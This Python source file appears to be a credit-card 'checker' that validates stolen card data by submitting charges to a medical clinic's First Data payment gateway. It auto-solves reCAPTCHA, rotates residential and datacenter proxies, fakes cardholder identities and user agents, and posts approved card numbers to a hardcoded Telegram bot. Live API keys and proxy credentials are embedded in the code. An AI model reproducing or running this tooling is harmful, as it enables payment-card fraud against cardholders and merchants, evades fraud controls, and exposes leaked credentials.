import httpx
import os
from playwright.sync_api import Playwright, Page
from playwright.async_api import async_playwright, Browser
from playwright_recaptcha import recaptchav2, RecaptchaSolveError
import asyncio
from randomuser import RandomUser
from fake_useragent import UserAgent
import random
import requests
import re
import time
import json
import psutil
from gates.utils.browser_profile import generate_profile
# from .gates.utils.browser_profile import generate_profile
error_response = ['Invalid merchant information: 57-Terminal is not programmed for this service - call Customer Support',
                  'captchaError',
                  'Invalid Attempt.'
                  ]
# class dax_gate:
#     page = None
#     cc = None
#     info = None
#     user_agent = None
#     proxy = None


# def __init__(self, page, cc, info, user_agent=None, proxy=None, **kwargs):
#     page = page
#     cc = cc
#     info = info
#     proxy = proxy
#     user_agent = user_agent


cdir = os.getcwd()


def getUrl():
    with open(f"{cdir}/gates/sites/daxko.site", "r") as f:
        lines = f.readlines()

    random_line_num = random.randint(0, len(lines) - 1)
    site = lines[random_line_num].strip()
    return site
   
def get_enumproxy():
    
    url = "https://ephemeral-proxies.p.rapidapi.com/v2/datacenter/proxy"

    headers = {
        "X-RapidAPI-Key": "60f7bdf787msh61ddbd43812c12cp1059a4jsnd4564938be2c",
        "X-RapidAPI-Host": "ephemeral-proxies.p.rapidapi.com"
    }

    response = requests.request("GET", url, headers=headers).json()
    host = response['proxy']['host']
    port = response['proxy']['port']
    print(f"{host}:{port}")
    return f"{host}:{port}"
def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
def final(jmsg, servdt5, cookies, token, proxies, cc):
    user = RandomUser()
    name = user.get_full_name()
    pattern = r'[^A-Za-z0-9 ]+'
    matches = re.findall(pattern, name)
    while matches:
       user = RandomUser()
       name = user.get_full_name()
    fname = user.get_first_name()
    lname = user.get_last_name()
    street = user.get_street()
    phone = user.get_cell()
    email = user.get_email()
    postcode = "90001"

    card = cc.split("|")
    ccn = card[0]
    cc_2 = f"{ccn[:4]}+{ccn[4:8]}+{ccn[8:12]}+{ccn[12:16]}"

    mm = card[1]
    yy = card[2]
    yy2 = yy[2:]
    
    cvv = card[3]

    if ccn[:1] == "5":
        cardType = "mastercard"

    elif ccn[:1] == "4":
        cardType = "visa"

    elif ccn[:1] == "3":
        cardType = "amex"
    req = requests.Session
    
    proxies = {"http": "http://" + proxies,
              "https": "http://" + proxies} 
    reqUrl = "https://checkout.globalgatewaye4.firstdata.com/payment/cc_payment"
    req.proxies = proxies
    cookies_dict = {cookie['name']: cookie['value'] for cookie in cookies}

    headersList = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://checkout.globalgatewaye4.firstdata.com",
    "Referer": "https://checkout.globalgatewaye4.firstdata.com/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    
    }

    payload = f"jmsg={jmsg}&exact_cardholder_name={fname}+{lname}&servdt5={servdt5}&merchant=WSP-ACCES-o7E%26lQDhTA&x_card_num={ccn}&x_exp_date={mm}{yy2}&x_card_code={cvv}&cvd_presence_ind=1&x_address={street}&x_city=asdas&x_state=California&x_zip=90001&x_country=United+States&x_email={email}&g-recaptcha-response={token}"
    
    response = requests.post(reqUrl, data=payload,  headers=headersList, cookies=cookies_dict, proxies=proxies)
    print(response.status_code)
    try:
        if response:
            # print(response.text)
            if 'id="Transaction_Approved" value="YES"' in response.text:
                return {"status": "Approved"}
            else:
                return response
        else:
            return False
    except:
        print(response.text)
        return response



async def solve(url, p, ua, user_data_dir):

    firefo_ext = f"{cdir}/firefox-extension/buster_captcha_solver-2.0.1.xpi"

    page = None
    port = random.randint(9009, 9009)
    port_rotate = random.randint(9000, 9002)
    username = "geonode_KpJmpEv7Bg"
    password = "490e6d9c-ccfe-4ee8-b282-2e56e796eac6"
    GEONODE_DNS = f"http://premium-residential.geonode.com:{port}"

    async with async_playwright() as playwright:
        # resolution = random.choice["800,1280", "907,512", "960,600", "962,601", "1024,600", "1024,640"]  
        y_axis = random.randint(480, 1024)
        x_axis = random.randint(720, 1024)
        args = [
            "--deny-permission-prompts",
            "--no-default-browser-check",
            "--no-first-run",
            "--disable-popup-blocking",
            "--ignore-certificate-errors",
            "--no-service-autorun",
            f"--user-agent={ua}",
            "--headless=new",  # the new headless arg for chrome v109+. Use '--headless=chrome' as arg for browsers v94-108.
            f"--window-size={y_axis},{x_axis}",
        ]
          
        # proxy = {"server": p}   
        proxy = {"server": GEONODE_DNS, "username": username, "password": password}
        context = await playwright.firefox.launch_persistent_context(
            headless=True,
            proxy=proxy,
            args=args,
            user_data_dir=user_data_dir,
        )
        page = await context.new_page()     
            
        try:
           

            
            await page.goto("https://www.accesssportsmed.com/payment-gateway/",wait_until="networkidle", timeout=0)
            await page.wait_for_load_state("networkidle", timeout=60000)
            await page.locator("input[name=\"x_user1\"]").fill("2")
            await page.locator("input[name=\"x_user1\"]").click()
            await page.locator("input[name=\"x_user1\"]").fill("23213")
            await page.locator("input[name=\"x_user1\"]").dblclick()
            await page.locator("input[name=\"x_user1\"]").fill("23213dsad")
            await page.locator("input[name=\"x_user1\"]").press("Control+a")
            await page.locator("input[name=\"x_user1\"]").fill("asdasd asdasd")
            await page.locator("input[name=\"x_user2\"]").click()
            await page.locator("input[name=\"x_user2\"]").fill("213123")
            await page.get_by_role("button", name="Pay Now").click()
            await page.get_by_label("Amount").click()
            await page.get_by_label("Amount").fill("10")
            await page.get_by_role("button", name="Submit").click()
            await page.locator("#exact_cardholder_name").fill("sa")
            await page.locator("#exact_cardholder_name").click()
            await page.locator("#exact_cardholder_name").fill("sad asdsa")
            await page.locator("#x_card_num").click()
            await page.locator("#x_card_num").fill("2312312")
            await page.locator("#x_card_num").press("Control+a")
            await page.locator("#x_card_num").click(modifiers=["Control"])
            await page.locator("#x_card_num").press("Control+a")
            await page.locator("#x_card_num").fill("5223031007436475")
            await page.locator("#x_exp_date").click()
            await page.locator("#x_exp_date").fill("1212")
            await page.locator("#x_exp_date").dblclick()
            await page.locator("#x_exp_date").dblclick()
            await page.locator("#x_exp_date").press("Control+a")
            await page.locator("#x_exp_date").fill("1224")
            await page.locator("#x_card_code").click()
            await page.locator("#x_card_code").fill("000")
            await page.locator("#x_address").click()
            await page.locator("#x_address").fill("asdas ")
            await page.locator("#x_city").click()
            await page.locator("#x_city").fill("asdasdas")
            await page.get_by_text("Address City State/Province Alabama Alaska American Samoa Arizona Arkansas Armed").click()
            await page.locator("#x_city").fill("asdasdasc")
            await page.locator("#x_state").select_option("California")
            await page.locator("#x_zip").click()
            await page.locator("#x_zip").fill("90001")
            await page.locator("#cc_email").click()
            await page.locator("#cc_email").fill("dsad as")
            await page.locator("#cc_email").press("Control+a")
            await page.locator("#cc_email").fill("sadasd@gmail.com")
            jmsg = find_between(await page.content(), 'name="jmsg" id="jmsg" value="', '"')
            servdt5 = find_between(await page.content(), 'name="servdt5" id="cc_request_id" value="', '"')
            print(jmsg)
            print(servdt5)
            await page.wait_for_load_state(state="networkidle", timeout=0)
            page.set_default_navigation_timeout(50000)
            async with recaptchav2.AsyncSolver(page) as solver:
                await page.wait_for_timeout(3000)
                try :
                    token = await solver.solve_recaptcha(attempts=1)
                    print(token)
                    await page.wait_for_timeout(3000)
                except:
                    pass
            cookies = await page.context.cookies()
            await page.close()
            await context.close()
            time.sleep(2)
            return jmsg, servdt5, cookies, token
    
        except RecaptchaSolveError as reError:
            # await page.reload(timeout=0, wait_until="networkidle")
            print(f"Captcha Error: {reError}")
            await page.close()
            await context.close()
           
            # return "captchaError"
        # except:
        #     await page.close()
        #     await context.close()




# def get_user():
#     user = RandomUser({"Country": "United States"})
#     _name = user.get_full_name()
#     latin_pattern = re.compile(r'^[a-zA-Z\s]+$') # Matches one or more letter from A-Z (lowercase or uppercase) and whitespace

#     while latin_pattern.match(_name):
#          user = RandomUser({"Country": "United States"})
#          _name = user.get_full_name()
#          latin_pattern = re.compile(r'^[a-zA-Z\s]+$')
#     return user

def process_check(cc, p, reqUrl, ua, user_data_dir):
    
    
    donotion = None
    reqver = None
    insta = None
    gResponse = None
    client = requests.session()
    proxies = {"http": "http://" + p,
              "https": "http://" + p} 
    client.proxies = proxies
    def req_one():
        headersList = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
            "accept": "application/json, text/javascript, */*; q=0.01",
        }
        payload = ""

        data = client.get(reqUrl, headers=headersList)
        cookies = data.cookies
        data = data.text
        reqver = find_between(
            str(data), 'name="__RequestVerificationToken" type="hidden" value="', '"'
        )
        donotion = find_between(str(data), 'id="donotions" value="', '"')
        insta = find_between(str(data), "ineum('key', '", "'")

        return reqver, donotion, insta, cookies

        # gResponse = solve(reqUrl)
        # print(gResponse.text)

    def req_two():
        reqver, donotion, insta, cookies = req_one()

        # insta = insta.split('-')[1]
        gResponse = asyncio.run(solve(reqUrl, p, ua, user_data_dir))
        jmsg, servt5, cookie, token = gResponse
        response = final(jmsg, servt5, cookie, token, p)
        if response:
                return response
 
        # if gResponse:
        #     print(reqver)
        #     print(donotion)
        #     print(insta)

            # user = RandomUser()
            # name = user.get_full_name()
            # fname = user.get_first_name()
            # lname = user.get_last_name()
            # street = user.get_street()
            # phone = user.get_cell()
            # email = user.get_email()
            # postcode = "90001"

            # card = cc.split("|")
            # ccn = card[0]
            # cc_2 = f"{ccn[:4]}+{ccn[4:8]}+{ccn[8:12]}+{ccn[12:16]}"

            # mm = card[1]
            # yy = card[2]
            # cvv = card[3]

            # if ccn[:1] == "5":
            #     cardType = "mastercard"

            # elif ccn[:1] == "4":
            #     cardType = "visa"

            # elif ccn[:1] == "3":
            #     cardType = "amex"

            # print(gResponse)
            # headersList = {
            #     "accept": "application/json, text/javascript, */*; q=0.01",
            #     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            #     "origin": "https://ops1.operations.daxko.com",
            #     "referer": reqUrl,
            #     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
            #     "x-requested-with": "XMLHttpRequest",
            # }

            # payload = f"campaign_id=0&campaigner_id=0&gift_type=0&memorial=&payment_info_s=%7B%22payment_amount%22%3A%2225%22%2C%22existing_billing_method_id%22%3Anull%2C%22save_billing_method%22%3Atrue%2C%22notes%22%3A%22%22%2C%22method%22%3A%22credit_card%22%2C%22credit_card%22%3A%7B%22name_on_account%22%3A%22{name}%22%2C%22avs_address%22%3A%22{street}%22%2C%22avs_zip_code%22%3A%22{postcode}%22%2C%22card_number%22%3A%22{ccn}%22%2C%22card_type%22%3A%22{cardType}%22%2C%22cvv%22%3A%22{cvv}%22%2C%22expiration_month%22%3A%22{mm}%22%2C%22expiration_year%22%3A%22{yy}%22%2C%22card_number_formatted%22%3A%22{cc_2}%22%7D%7D&pledge_amount=15.00&min_amount=&payment_frequency=-1&repeat_every=1&number_of_payment=&start_date=&donotions={donotion}&recaptcha_response={gResponse}&__RequestVerificationToken={reqver}&person_s=%7B%22first_name%22%3A%22{fname}%22%2C%22last_name%22%3A%22{lname}%22%2C%22email%22%3A%22{email}%22%2C%22phone_number%22%3A%22{phone}%22%2C%22mem_unit_id%22%3A%22%22%2C%22mem_id%22%3A%22%22%2C%22address_line_1%22%3A%22%22%2C%22address_line_2%22%3A%22%22%2C%22city%22%3A%22%22%2C%22zip%22%3A%2290001%22%2C%22country%22%3A%22US%22%7D"

            # data = client.post(
            #     f"{reqUrl}/make_payment",
            #     cookies=cookies,
            #     data=payload,
            #     headers=headersList,
            # ).text
            # if '"success":true' in data or "CVV2/VAK Failure" in data or "CVV2 Mismatch" in data or "Approved" in data:
            #     requests.get('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
        
            # respo = await get_response(navigate)

            # print(data)
            
                
            # return data
    return req_two()

def process_all(cc, profile):   

    proces=None
    tries = 0
    limit = 10
    while proces != "Done" and tries <= limit:
        tries = tries + 1
        time.sleep(1)  # import time
        p=get_enumproxy()
        reqUrl = getUrl()
        print(profile)
        ua = UserAgent()
        ua = ua['Firefox']
        gResponse = asyncio.run(solve(reqUrl, p, ua, profile))
        if gResponse:
            jmsg, servt5, cookie, token = gResponse
            response = final(jmsg, servt5, cookie, token, p, cc)
            if 'id="Transaction_Error" value="false"' in response.text:
                    if 'id="Transaction_Approved" value="YES"' in response.text:
                        requests.get('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
                        return {'rescode': '100', 'message': 'Approved', 'AVS': 'X'}
                    else:
                        AVS = find_between(str(response.text), 'name="AVS" id="AVS" value="', '"')
                        message = find_between(str(response.text), 'id="Bank_Message" value="', '"')
                        rescode = find_between(str(response.text), 'id="Bank_Resp_Code" value="', '"')
                        return {"rescode": rescode, "message": message, "AVS": AVS}
        else:
            profile = generate_profile()
        # errormsg = find_between(result, '"error_message":"','"')
        # if errormsg not in error_response:
        #     proces = "Done"
        # else:
        #     proces = "Not Done"
    # return response
    
# respo = process_all("5115000041839763|12|2024|068", "tmp/profile_data_dir")
# print(respo)